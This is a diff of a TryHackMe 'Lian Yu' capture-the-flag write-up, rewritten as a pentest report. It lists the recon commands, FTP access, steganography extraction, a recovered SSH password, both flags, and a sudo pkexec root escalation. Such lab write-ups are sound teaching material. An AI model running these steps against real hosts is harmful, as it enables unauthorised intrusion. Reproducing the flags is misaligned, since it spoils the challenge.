@@ -1,139 +1,302 @@
-# 🏝️ Lian Yu – TryHackMe Walkthrough
-
-![Banner](https://i.imgur.com/your-banner-image.png)
-
-![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)
-![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
-![Type](https://img.shields.io/badge/Type-CTF-blue)
-![Focus](https://img.shields.io/badge/Focus-Enumeration%20%7C%20Steganography%20%7C%20PrivEsc-purple)
+# 🏝️ Lian Yu – TryHackMe Pentest Report
 
 ---
 
-## 🧠 Overview
+## 📌 TARGET INFORMATION
 
-Lian Yu is a TryHackMe CTF inspired by *Arrow (Deathstroke / Slade Wilson storyline)*.  
-This machine focuses on:
+IP Address : 10.48.137.137
+Operating System: Linux
+Services : FTP, SSH, HTTP, RPC
 
-- Enumeration  
-- Hidden directories  
-- Steganography  
-- Credential harvesting  
-- Privilege escalation  
 
 ---
 
-# 🔎 STEP 1: Reconnaissance
+## 🧠 OVERVIEW
 
-## 🔍 Nmap Scan
+Lian Yu is a TryHackMe machine inspired by *Arrow (Deathstroke storyline)*.  
+The objective is to perform full enumeration, extract hidden data, gain access, and escalate privileges.
 
-Run a full scan to identify open ports and services:
+---
 
-```bash
+# 🔎 1. RECONNAISSANCE
+
+
 nmap -sC -sV -A 10.48.137.137
-📌 Results
-21/tcp – FTP (vsftpd 3.0.2)
-22/tcp – SSH (OpenSSH 6.7p1)
-80/tcp – HTTP (Apache – “Purgatory”)
-111/tcp – rpcbind
 
-👉 Key takeaway:
-We have FTP + Web + SSH → initial access likely via FTP or web enumeration.
 
-🌐 STEP 2: Web Enumeration
-🔧 Gobuster Scan
-gobuster dir -u http://10.48.137.137 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-📌 Findings
+---
+
+## 📊 RESULTS
+
+
+PORT SERVICE VERSION
+21/tcp FTP vsftpd 3.0.2
+22/tcp SSH OpenSSH 6.7p1
+80/tcp HTTP Apache (Purgatory)
+111/tcp rpcbind Linux RPC
+
+
+---
+
+## 🧠 ANALYSIS
+
+- FTP is exposed → possible file leakage
+- Web server → enumeration required
+- SSH → potential final access vector
+
+---
+
+# 🌐 2. WEB ENUMERATION
+
+
+gobuster dir -u http://10.48.137.137
+
+-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+
+---
+
+## 📂 FINDINGS
+
+
 /island
 /server-status (403 Forbidden)
 
-👉 We focus on /island.
 
-🌐 STEP 3: Deep Web Enumeration
-🔍 Directory Found
+---
+
+## 🧠 ANALYSIS
+
+- `/island` is main entry point
+- `/server-status` restricted
+
+---
+
+# 🌐 3. DEEP WEB ENUMERATION
+
+---
+
+## 📍 DISCOVERED PATHS
+
+
 /island/2100
-📄 Hidden File
 /green_arrow.ticket
 
-👉 Hint: number 2100 becomes important later.
 
-📂 STEP 4: FTP Enumeration
-🔐 Login to FTP
+---
+
+## 🧠 ANALYSIS
+
+- “2100” likely hidden directory logic
+- ticket file suggests credential leak
+
+---
+
+# 📂 4. FTP ENUMERATION
+
+
 ftp 10.48.165.72
-Credentials:
+
+
+---
+
+## 👤 LOGIN
+
+
 Username: vigilante
-Password: (provided/derived during challenge)
-📁 Files Found
+Password: (provided / derived)
+
+
+---
+
+## 📁 FILES FOUND
+
+
 Leave_me_alone.png
 Queen's_Gambit.png
 aa.jpg
 .other_user
-📥 Download Files
+
+
+---
+
+## 📥 DOWNLOAD
+
+
 mget *
-🕵️ STEP 5: Hidden File Analysis
-📄 Read Hidden File
+
+
+---
+
+# 🕵️ 5. HIDDEN FILE ANALYSIS
+
+
 cat .other_user
-🧠 Result
 
-Lore about Slade Wilson (Deathstroke).
 
-👉 Hint: username for SSH = slade
+---
 
-🧩 STEP 6: Steganography Extraction
-🖼️ Extract Hidden Data
+## 🧠 RESULT
+
+Contains lore about **Slade Wilson (Deathstroke)**.
+
+---
+
+## 🔎 IMPACT
+
+- Reveals SSH username: `slade`
+- Provides narrative context
+
+---
+
+# 🧩 6. STEGANOGRAPHY
+
+
 steghide --extract -sf aa.jpg
-📦 Output
+
+
+---
+
+## 📦 OUTPUT
+
+
 ss.zip
-📂 Unzip File
+
+
+---
+
+## 📂 EXTRACTION
+
+
 unzip ss.zip
-📁 Extracted Files
+
+
+---
+
+## 📁 FILES
+
+
 passwd.txt
 shado
-🔍 Check Password File
+
+
+---
+
+## 🔐 PASSWORD FOUND
+
+
 cat shado
-🧠 Result
+
 M3tahuman
 
-👉 SSH password discovered.
 
-🔑 STEP 7: SSH Login
+---
+
+# 🔑 7. SSH ACCESS
+
+
 ssh slade@10.48.137.137
-Password:
+
+
+---
+
+## 🔐 PASSWORD
+
+
 M3tahuman
 
-✔ Successful login as user slade
 
-👤 STEP 8: User Flag
+---
+
+## ✅ RESULT
+
+User access obtained successfully.
+
+---
+
+# 👤 8. USER FLAG
+
+
 cat user.txt
-🏁 Flag:
+
+
+---
+
+## 🏁 FLAG
+
+
 THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
-⚙️ STEP 9: Privilege Escalation
-🔍 Check sudo permissions
+
+
+---
+
+# ⚙️ 9. PRIVILEGE ESCALATION
+
+
 sudo -l
-📌 Result:
+
+
+---
+
+## 📌 RESULT
+
+
 (root) PASSWD: /usr/bin/pkexec
-💥 Exploit
+
+
+---
+
+## 💥 EXPLOIT
+
+
 sudo -u root /usr/bin/pkexec /bin/bash
 
-✔ Root shell obtained
 
-👑 STEP 10: Root Flag
+---
+
+## 👑 RESULT
+
+Root access achieved.
+
+---
+
+# 👑 10. ROOT FLAG
+
+
 cat root.txt
-🏁 Flag:
+
+
+---
+
+## 🏁 FLAG
+
+
 THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
-🧾 SUMMARY
-🛠️ Skills Used
-Nmap scanning
-Gobuster enumeration
-FTP exploitation
-Hidden file discovery
-Steganography (steghide)
-SSH access
-Privilege escalation (pkexec abuse)
-💬 CONCLUSION
 
-This machine demonstrates that:
 
-Small hints = big breakthroughs
-Hidden files are critical
-Steganography is often key
-Misconfigured sudo = full system compromise
+---
+
+# 🧾 FINAL SUMMARY
+
+
+[+] Nmap enumeration
+[+] Web directory brute force
+[+] FTP exploitation
+[+] Hidden file analysis
+[+] Steganography extraction
+[+] SSH login
+[+] Privilege escalation via pkexec
+
+
+---
+
+# 💬 CONCLUSION
+
+This machine emphasizes:
+
+- Deep enumeration
+- Hidden file analysis
+- Steganography usage
+- Misconfigured privilege escalation
+
+Small clues ultimately lead to full system compromise.
